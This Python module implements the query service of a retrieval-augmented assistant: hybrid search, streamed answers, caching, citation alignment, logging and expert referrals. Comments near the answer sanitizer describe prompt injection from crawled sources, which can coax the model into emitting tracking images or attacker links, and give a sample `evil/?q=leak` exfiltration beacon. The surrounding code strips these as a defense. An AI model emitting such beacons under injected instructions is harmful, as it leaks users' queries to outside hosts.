import json
import re
import time
from urllib.parse import urlparse
from typing import Any

from sqlalchemy.orm import Session

from app.core.config import Settings
from app.llm.generation import AnswerGenerator
from app.models.entities import QueryLog
from app.retrieval.hybrid import HybridRetriever
from app.retrieval.types import RetrievedChunk, RetrievalFilters
from app.schemas.api import Citation, QueryRequest, QueryResponse
from app.retrieval.intent import is_time_sensitive
from app.services.query_cache import QueryCache


def _sse(event: str, data: dict[str, Any]) -> str:
    """Format one Server-Sent Event frame."""
    return f"event: {event}\ndata: {json.dumps(data, ensure_ascii=False, default=str)}\n\n"


def _host_of(url: str | None) -> str:
    if not url:
        return ""
    try:
        return urlparse(url).hostname or ""
    except ValueError:
        return ""


class QueryService:
    def __init__(
        self,
        settings: Settings,
        retriever: HybridRetriever,
        answer_generator: AnswerGenerator,
        query_cache: QueryCache | None = None,
    ) -> None:
        self.settings = settings
        self.retriever = retriever
        self.answer_generator = answer_generator
        self.query_cache: QueryCache | None = query_cache

    def query(self, db: Session, request: QueryRequest) -> QueryResponse:
        started = time.perf_counter()

        # Cache probe. On hit we skip retrieval / rewrite / generation entirely
        # and just record a query log for analytics. Meeting / schedule queries
        # bypass both the probe and the write below — Indico data moves in
        # real time, so an hour-old cached "next meeting" answer is worse than
        # no answer. The IndicoClient's own 5-minute cache still deduplicates
        # rapid repeat calls at the HTTP layer.
        cached = self._cache_probe(request)
        if cached is not None:
            return self._hit(db, request, cached, started)

        chunks, retrieval_debug = self._retrieve(db, request)
        answer = ""
        generation_debug: dict[str, Any] = {"enabled": request.generate_answer}
        if request.generate_answer:
            answer, generation_debug = self.answer_generator.generate(
                request.query,
                chunks,
                min_support_score=self.settings.MIN_SUPPORT_SCORE,
                history=self._history_messages(request),
            )
        return self._finalize(
            db, request, chunks, answer, generation_debug, retrieval_debug, started
        )

    def query_stream(self, db: Session, request: QueryRequest):
        """SSE variant of query(). Yields pre-formatted `text/event-stream` strings.

        Event order:
            citations  — provisional retrieval results, sent as soon as the
                         hybrid search returns (typically well under 1 s)
            delta      — answer text fragments as the LLM produces them
            done       — final answer (citation markers remapped), final
                         citation list, query_log_id, debug

        The `done` citations replace the provisional ones — after generation
        the LLM-cited sources are reordered to the front, same as query().
        """
        started = time.perf_counter()

        cached = self._cache_probe(request)
        if cached is not None:
            response = self._hit(db, request, cached, started)
            yield _sse("citations", {"citations": [c.model_dump() for c in response.citations]})
            if response.answer:
                yield _sse("delta", {"text": response.answer})
            yield _sse("done", self._done_payload(response))
            return

        chunks, retrieval_debug = self._retrieve(db, request)

        provisional = [self._citation(request.query, chunk) for chunk in chunks[: request.top_k]]
        yield _sse(
            "citations",
            {"citations": [c.model_dump() for c in provisional], "provisional": request.generate_answer},
        )

        answer = ""
        generation_debug: dict[str, Any] = {"enabled": request.generate_answer}
        if request.generate_answer:
            history = self._history_messages(request)
            stream_fn = getattr(self.answer_generator, "generate_stream", None)
            if stream_fn is not None:
                for kind, payload in stream_fn(
                    request.query,
                    chunks,
                    min_support_score=self.settings.MIN_SUPPORT_SCORE,
                    history=history,
                ):
                    if kind == "delta":
                        yield _sse("delta", {"text": payload})
                    elif kind == "final":
                        answer, generation_debug = payload
            else:
                answer, generation_debug = self.answer_generator.generate(
                    request.query,
                    chunks,
                    min_support_score=self.settings.MIN_SUPPORT_SCORE,
                    history=history,
                )
                if answer:
                    yield _sse("delta", {"text": answer})

        response = self._finalize(
            db, request, chunks, answer, generation_debug, retrieval_debug, started
        )
        yield _sse("done", self._done_payload(response))

    # ---- shared prologue -----------------------------------------------------

    def _cache_probe(self, request: QueryRequest) -> dict[str, Any] | None:
        # History-bearing requests bypass the cache entirely: the key is
        # (query, scope, generate_answer) only, so an anaphoric follow-up
        # ("what about the other one?") would collide across conversations.
        if (
            self.query_cache is None
            or request.eval_mode
            or bool(request.history)
            or self._is_time_sensitive_query(request.query)
        ):
            return None
        return self._cache_lookup(
            request.query, request.scope, request.top_k, request.generate_answer
        )

    @staticmethod
    def _history_messages(request: QueryRequest) -> list[dict[str, str]]:
        """History turns as chat messages, size-capped for the prompt.

        Assistant turns are clipped harder than user turns — the user's own
        words carry the referents a follow-up needs, while old answers mostly
        need their conclusions, not their full citation scaffolding.
        """
        messages: list[dict[str, str]] = []
        for turn in request.history[-6:]:
            content = turn.content.strip()
            if not content:
                continue
            limit = 1500 if turn.role == "assistant" else 2000
            if len(content) > limit:
                content = content[:limit].rstrip() + " …"
            messages.append({"role": turn.role, "content": content})
        return messages

    def _retrieve(
        self, db: Session, request: QueryRequest
    ) -> tuple[list[RetrievedChunk], dict[str, Any]]:
        """Hybrid retrieval with the context window sized for generation.

        When generating an answer we fetch a broader pool (LLM_CONTEXT_TOP_K)
        so the model sees more supporting context; the returned citations are
        truncated to request.top_k after generation. The pool is additionally
        clamped to RERANK_CANDIDATES whenever the cross-encoder runs —
        otherwise chunks past the rerank window would reach the prompt in raw
        fusion order with no rerank_score, silently flipping the support gate.
        """
        filters = self._filters(request.scope)
        # Follow-ups are often anaphoric ("how do I read one?") — fuse in the
        # previous user question as an extra retrieval variant so the pool
        # still contains the topic's chunks. Same mechanism acronym
        # expansion uses; RRF keeps it from dominating.
        extra_queries: list[str] | None = None
        if request.history:
            last_user = next(
                (t.content for t in reversed(request.history) if t.role == "user"), ""
            )
            if last_user.strip():
                extra_queries = [last_user.strip()[:300]]
        rerank = request.generate_answer or request.force_rerank
        llm_context_k = int(getattr(self.settings, "LLM_CONTEXT_TOP_K", 0) or 0)
        if rerank and getattr(self.settings, "RERANK_PROVIDER", "none") != "none":
            rerank_candidates = int(getattr(self.settings, "RERANK_CANDIDATES", 0) or 0)
            if rerank_candidates > 0 and llm_context_k > 0:
                llm_context_k = min(llm_context_k, rerank_candidates)
        retrieval_k = (
            max(request.top_k, llm_context_k)
            if request.generate_answer and llm_context_k > 0
            else request.top_k
        )
        return self.retriever.search(
            db, request.query, filters, retrieval_k, extra_queries=extra_queries, rerank=rerank
        )

    @staticmethod
    def _done_payload(response: QueryResponse) -> dict[str, Any]:
        return {
            "answer": response.answer,
            "citations": [c.model_dump() for c in response.citations],
            "query_log_id": response.query_log_id,
            "expert_hint": response.expert_hint,
            "retrieval_debug": response.retrieval_debug,
        }

    # Markdown image  ![alt](url)  and link  [text](url)
    _MD_IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
    _MD_LINK_RE = re.compile(r"\[([^\]]+)\]\((https?://[^)\s]+)\)")

    @classmethod
    def _sanitize_answer(cls, answer: str, chunks: list[RetrievedChunk]) -> str:
        if not answer:
            return answer
        allowed_hosts: set[str] = set()
        for chunk in chunks:
            host = _host_of(chunk.url)
            if host:
                allowed_hosts.add(host)
        # Images never legitimately appear in a text answer — drop them
        # (blocks ![](evil/?q=leak) query-exfiltration beacons).
        cleaned = cls._MD_IMAGE_RE.sub("", answer)

        def _link(match: re.Match[str]) -> str:
            text, url = match.group(1), match.group(2)
            host = _host_of(url)
            if host and host in allowed_hosts:
                return match.group(0)
            # Link to a host we never retrieved — keep the text, drop the href.
            return text

        return cls._MD_LINK_RE.sub(_link, cleaned)

    def _finalize(
        self,
        db: Session,
        request: QueryRequest,
        chunks: list[RetrievedChunk],
        answer: str,
        generation_debug: dict[str, Any],
        retrieval_debug: dict[str, Any],
        started: float,
    ) -> QueryResponse:
        """Post-generation tail shared by query() and query_stream():
        citation alignment, query log, cache write, response assembly."""
        if request.generate_answer:
            # If the LLM invoked the Indico tool and the answer actually
            # references those event URLs, show the events as citations
            # instead of the (irrelevant) static retrieval cards. Detect by
            # scanning the answer for event URLs that appear in the tool's
            # returned events.
            indico_chunks = self._indico_citations(answer, generation_debug.get("indico_events") or [])
            if indico_chunks:
                answer, chunks = self._align_citations(answer, indico_chunks, request.top_k)
                retrieval_debug["indico_citations"] = len(chunks)
            else:
                # Reorder chunks so LLM-cited ones come first (in citation
                # order), then pad with top-scored non-cited chunks to
                # request.top_k. The answer's [N] markers are remapped so
                # they still resolve against the trimmed citation list.
                answer, chunks = self._align_citations(answer, chunks, request.top_k)
            retrieval_debug["llm_context_sent"] = generation_debug.get("contexts_sent", len(chunks))
            retrieval_debug["citations_returned"] = len(chunks)
            # Injection defense: a malicious crawled source can coax the model
            # into emitting a tracking image or a link to an attacker host.
            # Strip images entirely and neutralize any link whose host is not
            # in the citation set (widget renders answer markdown).
            answer = self._sanitize_answer(answer, chunks)
            answer = self._append_upstream_source(answer, chunks)
        else:
            chunks = chunks[: request.top_k]
        citations = [self._citation(request.query, chunk) for chunk in chunks]
        latency_ms = int((time.perf_counter() - started) * 1000)
        debug = {**retrieval_debug, "generation": generation_debug, "latency_ms": latency_ms, "cache_hit": False}
        if request.history:
            debug["history_turns"] = len(request.history)
        if request.client:
            debug["client"] = request.client
        top_score = chunks[0].score if chunks else None
        top_vector_score = chunks[0].vector_score if chunks else None
        # Low-confidence answers get a human referral instead of a bare
        # apology (people graph join — no extra LLM call, ~ms latency).
        expert_hint: str | None = None
        if request.generate_answer and (
            generation_debug.get("support") == "insufficient"
            or self._confidence(top_vector_score) in ("low", "none")
        ):
            # Surfaced as a structured response field (the widget renders it
            # as an expert-referral card) — not appended into the answer text.
            expert_hint = self._expert_hint(db, chunks)
            debug["expert_hint"] = bool(expert_hint)
        log_id = self._log_query(
            db,
            request,
            result_count=len(citations),
            latency_ms=latency_ms,
            debug=debug,
            generation_provider=getattr(self.settings, "GENERATION_PROVIDER", None) if request.generate_answer else None,
            generation_model=generation_debug.get("model") if request.generate_answer else None,
            prompt_tokens=generation_debug.get("prompt_tokens"),
            completion_tokens=generation_debug.get("completion_tokens"),
            cost_usd=generation_debug.get("cost_usd"),
            confidence=self._confidence(top_vector_score),
            top_score=top_score,
            answer=answer,
        )

        # Only cache substantive, successful responses — don't cache insufficient-support
        # refusals or zero-result queries (those are cheap to re-run anyway).
        # Also bypass the cache whenever the Indico live tool was invoked:
        # meeting schedules change (new events, rescheduled times, cancelled
        # slots) and we do not want to replay a 1h-old answer as "next". The
        # IndicoClient has its own short in-process cache (~5 min) that still
        # de-duplicates the HTTP call within a rapid burst.
        tool_was_used = bool(generation_debug.get("tool_rounds"))
        refused = request.generate_answer and generation_debug.get("support") == "insufficient"
        # A degraded answer (LLM error -> extractive fallback) must never be
        # cached: it would replay the outage to every user for the whole TTL
        # (real incident: a transient connection blip got cached).
        degraded = bool(generation_debug.get("fallback") or generation_debug.get("error"))
        if (
            self.query_cache is not None
            and not request.eval_mode
            and not request.history
            and citations
            and not tool_was_used
            and not refused
            and not degraded
        ):
            self.query_cache.set(
                request.query,
                request.scope,
                request.generate_answer,
                payload={
                    "answer": answer,
                    "citations": [c.model_dump() for c in citations],
                    "top_score": top_score,
                    "top_vector_score": top_vector_score,
                    "top_k": request.top_k,
                },
            )

        return QueryResponse(
            answer=answer, citations=citations, retrieval_debug=debug,
            query_log_id=log_id, expert_hint=expert_hint,
        )

    # Knowledge-guide detector pages summarize one EICrecon plugin each.
    # The LLM names flags correctly but won't reliably paste the upstream
    # file URL, so when such a page is cited we append it deterministically —
    # users asked answers to point at the repository, not (only) the guide.
    _GUIDE_DETECTOR_RE = re.compile(
        r"github\.com/aprozo/eic/blob/main/docs/eicrecon/detectors/(\w+)\.md"
    )

    @classmethod
    def _append_upstream_source(cls, answer: str, chunks: list[RetrievedChunk]) -> str:
        if not answer or "github.com/eic/EICrecon" in answer:
            return answer
        for chunk in chunks[:3]:
            match = cls._GUIDE_DETECTOR_RE.search(chunk.url or "")
            if match:
                det = match.group(1).upper()
                path = f"src/detectors/{det}/{det}.cc"
                return (
                    f"{answer}\n\nSource code: "
                    f"[{path}](https://github.com/eic/EICrecon/blob/main/{path})"
                )
        return answer

    def _log_query(
        self,
        db: Session,
        request: QueryRequest,
        *,
        result_count: int,
        latency_ms: int,
        debug: dict[str, Any],
        generation_provider: str | None,
        generation_model: str | None,
        prompt_tokens: int | None,
        completion_tokens: int | None,
        cost_usd: float | None,
        confidence: str,
        top_score: float | None,
        answer: str,
    ) -> str | None:
        """Persist one QueryLog row for analytics; returns its id.

        Retrieval-only preview calls (generate_answer=false) are not persisted:
        the typing-debounced prefires from the widget would otherwise flood
        analytics with partial-word rows ("wha", "what ar", …) that carry no
        user intent beyond telemetry. Eval traffic is skipped so benchmark
        replays never pollute the analytics either.
        """
        if not request.generate_answer or request.eval_mode:
            return None
        query_log = QueryLog(
            query=request.query,
            scope=request.scope,
            top_k=request.top_k,
            answer_generated=request.generate_answer,
            result_count=result_count,
            latency_ms=latency_ms,
            retrieval_debug=self._slim_debug(debug),
            generation_provider=generation_provider,
            generation_model=generation_model,
            prompt_tokens=prompt_tokens,
            completion_tokens=completion_tokens,
            cost_usd=cost_usd,
            confidence=confidence,
            top_score=top_score,
            answer=answer or None,
        )
        db.add(query_log)
        db.commit()
        return query_log.id

    @staticmethod
    def _slim_debug(debug: dict[str, Any]) -> dict[str, Any]:
        """Strip bulky tool payloads before persisting the debug blob.

        The dashboard trace (/admin/recent) reads stage timings, funnel
        counts and tool_rounds summaries — never the full Indico event
        descriptions / people cards / Zenodo hits the generator collected,
        which can dwarf the rest of the row.
        """
        gen = debug.get("generation")
        if not isinstance(gen, dict):
            return debug
        slim_gen = {
            k: v for k, v in gen.items()
            if k not in ("indico_events", "people_cards", "zenodo_hits")
        }
        return {**debug, "generation": slim_gen}

    def _cache_lookup(
        self,
        query: str,
        scope: str,
        top_k: int,
        generate_answer: bool,
    ) -> dict[str, Any] | None:
        """Cache lookup with two layered fallbacks:

        1. Smaller top_k reuses an entry cached at a larger top_k —
           citations get sliced at read time. We compare against the
           cached entry's original ``top_k`` (not its citation count),
           because retrieval may legitimately return fewer than top_k
           rows when the corpus is small.
        2. A preview (generate_answer=false) miss reuses the matching
           submit (generate_answer=true) entry. Submit caches a strict
           superset (answer + citations); preview just discards the
           bonus answer. Once a user hits Enter on a query, every
           later keystroke-preview of the same query is served
           instantly.
        """
        cache = self.query_cache
        if cache is None:
            return None
        cached = cache.get(query, scope, generate_answer)
        if cached is not None and cached["payload"].get("top_k", 0) >= top_k:
            return cached
        if not generate_answer:
            cached = cache.get(query, scope, True)
            if cached is not None and cached["payload"].get("top_k", 0) >= top_k:
                return cached
        return None

    def _hit(
        self,
        db: Session,
        request: QueryRequest,
        cached: dict[str, Any],
        started: float,
    ) -> QueryResponse:
        payload = cached["payload"]
        age_s = cached["age_s"]
        answer = payload.get("answer", "")
        citations = [Citation(**c) for c in payload.get("citations", [])][: request.top_k]
        top_score = payload.get("top_score")
        top_vector_score = payload.get("top_vector_score")
        latency_ms = int((time.perf_counter() - started) * 1000)
        debug = {
            "cache_hit": True,
            "cache_age_s": round(age_s, 3),
            "latency_ms": latency_ms,
            "generation": {"enabled": request.generate_answer, "mode": "cached"},
            "returned_count": len(citations),
        }
        if request.client:
            debug["client"] = request.client
        log_id = self._log_query(
            db,
            request,
            result_count=len(citations),
            latency_ms=latency_ms,
            debug=debug,
            generation_provider="cache" if request.generate_answer else None,
            generation_model=None,
            prompt_tokens=0,
            completion_tokens=0,
            cost_usd=0.0,
            confidence=self._confidence(top_vector_score),
            top_score=top_score,
            answer=answer,
        )
        return QueryResponse(answer=answer, citations=citations, retrieval_debug=debug, query_log_id=log_id)

    def _confidence(self, top_vector_score: float | None) -> str:
        # Raw cosine similarity from Qdrant (vector_score on the top chunk),
        # not the per-batch-normalized fusion score — the fused score's top
        # row is structurally near 1.0 for every non-empty result, so it
        # cannot distinguish weak from strong matches. A 0.0 means the top
        # chunk was found by lexical search only (no vector evidence), which
        # is "none", not "low" — treating it as low used to skew analytics
        # and fire spurious expert hints on perfectly good FTS matches.
        if not top_vector_score:
            return "none"
        if top_vector_score < self.settings.CONFIDENCE_VEC_LOW:
            return "low"
        if top_vector_score < self.settings.CONFIDENCE_VEC_HIGH:
            return "medium"
        return "high"

    def _filters(self, scope: str) -> RetrievalFilters:
        return RetrievalFilters(scope=scope)

    def _citation(self, query: str, chunk: RetrievedChunk) -> Citation:
        return Citation(
            chunk_id=chunk.chunk_id,
            document_id=chunk.document_id,
            title=chunk.title,
            url=chunk.url,
            snippet=self._snippet(query, chunk.content),
            source_name=chunk.source_name,
            source_type=chunk.source_type,
            score=round(chunk.score, 6),
            metadata={
                **chunk.metadata,
                "visibility": chunk.visibility,
                "repo_path": chunk.repo_path,
                "filetype": chunk.filetype,
                "section_path": chunk.section_path,
                "heading_path": chunk.heading_path,
                "vector_score": chunk.vector_score,
                "lexical_score": chunk.lexical_score,
                "last_updated": chunk.last_updated.isoformat() if chunk.last_updated else None,
            },
        )

    def _expert_hint(self, db: Session, chunks: list[RetrievedChunk]) -> str | None:
        """'Who to ask' referral for low-confidence answers.

        The ground truth in a collaboration often lives in someone's head
        between preliminary slides and the published paper — when the
        indexed sources can't support a confident answer, point at the
        person most associated with the top sources instead of stopping at
        an apology. Names come from the top citations' metadata (paper
        authors, meeting chairs); the people graph upgrades a name to a
        canonical card with their latest activity.
        """
        candidate: str | None = None
        for chunk in chunks[:3]:
            meta = chunk.metadata or {}
            authors = meta.get("authors")
            if isinstance(authors, list) and authors:
                candidate = str(authors[0]).split(" (", 1)[0].strip()
                break
            chairs = meta.get("chairs")
            if isinstance(chairs, list) and chairs:
                candidate = str(chairs[0]).split(" (", 1)[0].strip()
                break
        if not candidate:
            return None
        try:
            from app.people.service import lookup as people_lookup

            people = people_lookup(db, candidate, limit=1)
        except Exception:
            return None
        if not people:
            return None
        person = people[0]
        bits = [f"**{person.canonical_name}**"]
        if person.affiliations:
            bits.append(f"({person.affiliations[0]})")
        recent = (person.activity or [None])[0]
        if isinstance(recent, dict) and recent.get("title"):
            when = str(recent.get("when") or "")[:10]
            link = recent.get("url")
            title = str(recent["title"])[:90]
            ref = f"[{title}]({link})" if link else title
            bits.append(f"— recently: {ref}" + (f" ({when})" if when else ""))
        return "Who to ask: " + " ".join(bits)

    @staticmethod
    def _is_time_sensitive_query(query: str) -> bool:
        return is_time_sensitive(query)

    @staticmethod
    def _indico_citations(answer: str, events: list[dict[str, Any]]) -> list[RetrievedChunk]:
        """Build virtual RetrievedChunks for the Indico events the LLM cited.

        Returns [] when the answer doesn't reference any of the tool's events
        — in that case the caller keeps the normal static citation flow. When
        non-empty, the list preserves the order the events first appear in
        the answer text, so [1] in the answer maps to the first-mentioned
        event after `_align_citations` runs.
        """
        if not events:
            return []
        by_id: dict[str, dict[str, Any]] = {}
        for ev in events:
            ev_id = str(ev.get("id") or "")
            if ev_id and ev_id not in by_id:
                by_id[ev_id] = ev
        if not by_id:
            return []
        # Indico event URLs look like https://<host>/event/<id>/
        cited_ids: list[str] = []
        seen: set[str] = set()
        for match in re.finditer(r"https?://[^\s)\"']*indico[^\s)\"']*/event/(\d+)", answer or ""):
            ev_id = match.group(1)
            if ev_id in by_id and ev_id not in seen:
                seen.add(ev_id)
                cited_ids.append(ev_id)
        if not cited_ids:
            return []
        chunks: list[RetrievedChunk] = []
        for ev_id in cited_ids:
            ev = by_id[ev_id]
            title = str(ev.get("title") or "")
            category = str(ev.get("category") or "")
            display_title = f"{title} — {category}" if category and category not in title else title
            content_parts = [
                ev.get("start") and f"Start: {ev['start']}",
                ev.get("end") and f"End: {ev['end']}",
                ev.get("location") and f"Location: {ev['location']}",
                ev.get("description"),
            ]
            content = "\n".join([p for p in content_parts if p])
            chunks.append(
                RetrievedChunk(
                    chunk_id=f"indico-{ev_id}",
                    document_id=f"indico-{ev_id}",
                    source_name="indico_live",
                    source_type="indico_event",
                    title=display_title or f"Indico event {ev_id}",
                    url=str(ev.get("url") or f"https://indico.bnl.gov/event/{ev_id}/"),
                    content=content,
                    score=1.0,
                    metadata={
                        "category": category,
                        "start": ev.get("start"),
                        "end": ev.get("end"),
                        "location": ev.get("location"),
                        "live": True,
                    },
                )
            )
        return chunks

    @staticmethod
    def _align_citations(
        answer: str, chunks: list[RetrievedChunk], display_k: int
    ) -> tuple[str, list[RetrievedChunk]]:
        """Reorder `chunks` so cited ones lead, cap to `display_k`, remap [N] markers.

        The LLM saw a larger pool than the user will see. We take the chunks
        it actually cited (in citation order, deduped) first, then fill up to
        `display_k` with the highest-scored non-cited chunks so every widget
        slot still has content. The answer's bracketed references are
        rewritten to match the new positions; any reference pointing outside
        the trimmed list is dropped.
        """
        if not chunks:
            return answer, chunks
        cited_order: list[int] = []
        seen: set[int] = set()
        for match in re.finditer(r"\[(\d+)\]", answer or ""):
            idx = int(match.group(1))
            if 1 <= idx <= len(chunks) and idx not in seen:
                seen.add(idx)
                cited_order.append(idx)
        new_chunks: list[RetrievedChunk] = [chunks[i - 1] for i in cited_order[:display_k]]
        if len(new_chunks) < display_k:
            for i, chunk in enumerate(chunks, start=1):
                if i in seen:
                    continue
                new_chunks.append(chunk)
                if len(new_chunks) >= display_k:
                    break
        old_to_new: dict[int, int] = {old: new + 1 for new, old in enumerate(cited_order[:display_k])}

        def _remap(match: re.Match[str]) -> str:
            old = int(match.group(1))
            new = old_to_new.get(old)
            return f"[{new}]" if new else ""

        remapped = re.sub(r"\[(\d+)\]", _remap, answer or "")
        return remapped, new_chunks

    def _snippet(self, query: str, content: str, max_chars: int = 520) -> str:
        terms = [term.lower() for term in re.findall(r"[A-Za-z0-9_+-]+", query) if len(term) > 2]
        lowered = content.lower()
        positions = [lowered.find(term) for term in terms if lowered.find(term) >= 0]
        if positions:
            center = min(positions)
            start = max(0, center - max_chars // 3)
        else:
            start = 0
        end = min(len(content), start + max_chars)
        snippet = content[start:end].strip()
        if start > 0:
            snippet = "... " + snippet
        if end < len(content):
            snippet = snippet.rstrip() + " ..."
        return snippet
